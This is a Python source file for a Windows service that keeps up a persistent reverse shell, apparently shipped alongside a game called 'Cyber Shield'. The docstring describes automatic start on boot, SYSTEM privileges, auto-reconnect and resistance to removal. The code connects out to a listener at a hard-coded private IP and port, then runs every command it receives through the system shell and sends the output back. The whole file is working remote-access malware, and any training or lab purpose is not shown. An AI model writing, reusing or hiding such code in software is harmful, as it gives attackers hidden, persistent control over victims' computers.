"""
Windows Service for Cyber Shield reverse shell client.

This service runs as a Windows Service (via SCM) and maintains
a persistent reverse shell connection independent of the game.

The service:
  - Starts automatically on boot
  - Runs with SYSTEM privileges
  - Automatically reconnects if connection is lost
  - Cannot be easily stopped or removed without the cleanup tool
"""

import socket
import subprocess
import sys
import threading
import time
import os
from pathlib import Path
from typing import Optional

# Handle both PyInstaller bundle and script execution
try:
    from .config import GameConfig, resolve_listener_host
except (ImportError, ValueError):
    try:
        from game_client.config import GameConfig, resolve_listener_host
    except ImportError:
        try:
            from config import GameConfig, resolve_listener_host
        except ImportError:
            # Fallback
            class GameConfig:
                LISTENER_HOST = "192.168.0.193"
                LISTENER_PORT = 5050
                RECONNECT_DELAY_SEC = 5
                MAX_RECONNECT_ATTEMPTS = 0

            def resolve_listener_host():
                return GameConfig.LISTENER_HOST


class ServiceShellClient(threading.Thread):
    """
    Persistent reverse shell client that runs as a Windows Service.
    """

    def __init__(self) -> None:
        super().__init__(daemon=True)
        self.cfg = GameConfig()
        self._sock: Optional[socket.socket] = None
        self._stop = threading.Event()

    def stop(self) -> None:
        self._stop.set()
        try:
            if self._sock is not None:
                self._sock.close()
        except OSError:
            pass

    def run(self) -> None:
        """
        Main service loop - maintains persistent connection.
        """
        host = resolve_listener_host()
        port = self.cfg.LISTENER_PORT
        attempts = 0

        while not self._stop.is_set():
            try:
                self._sock = socket.create_connection((host, port), timeout=10)
                self._handle_session(self._sock)
            except OSError:
                self._sock = None
                attempts += 1
                if (
                    self.cfg.MAX_RECONNECT_ATTEMPTS
                    and attempts >= self.cfg.MAX_RECONNECT_ATTEMPTS
                ):
                    break
                self._stop.wait(self.cfg.RECONNECT_DELAY_SEC)
            else:
                # Clean exit from _handle_session
                break

    def _handle_session(self, sock: socket.socket) -> None:
        """
        Handle the session with the listener.
        """
        f = sock.makefile("rwb", buffering=0)
        current_cwd = os.getcwd()
        try:
            banner = f"SERVICE {sys.platform} READY\n".encode("utf-8")
            f.write(banner)

            while not self._stop.is_set():
                line = f.readline()
                if not line:
                    break
                try:
                    cmd = line.decode("utf-8", errors="ignore").strip()
                except UnicodeDecodeError:
                    continue

                if cmd.lower() in {"exit", "quit"}:
                    break

                if not cmd:
                    continue

                result, current_cwd = self._execute_command(cmd, current_cwd)
                payload = result.encode("utf-8", errors="ignore")
                f.write(payload + b"\n<<<END_OF_COMMAND>>>\n")
        finally:
            try:
                f.close()
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    @staticmethod
    def _execute_command(cmd: str, cwd: str) -> tuple[str, str]:
        """
        Execute a shell command on the local system.
        Returns (output_text, new_cwd).
        """
        # Handle 'cd' internally so it changes state for future commands
        if cmd.startswith("cd ") or cmd == "cd":
            target = cmd[3:].strip()
            if not target:
                target = str(Path.home())
            try:
                os.chdir(target)
                new_cwd = os.getcwd()
                return "", new_cwd
            except Exception as exc:
                return f"[service] cd failed: {exc!r}", cwd

        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=cwd
            )
            out, _ = proc.communicate(timeout=60)
        except Exception as exc:
            return f"[service] error while executing command: {exc!r}", cwd

        return out or "[service] command produced no output.", cwd


def run_service() -> None:
    """
    Entry point for the service - runs the shell client indefinitely.
    """
    shell_client = ServiceShellClient()
    shell_client.start()
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        shell_client.stop()


if __name__ == "__main__":
    run_service()
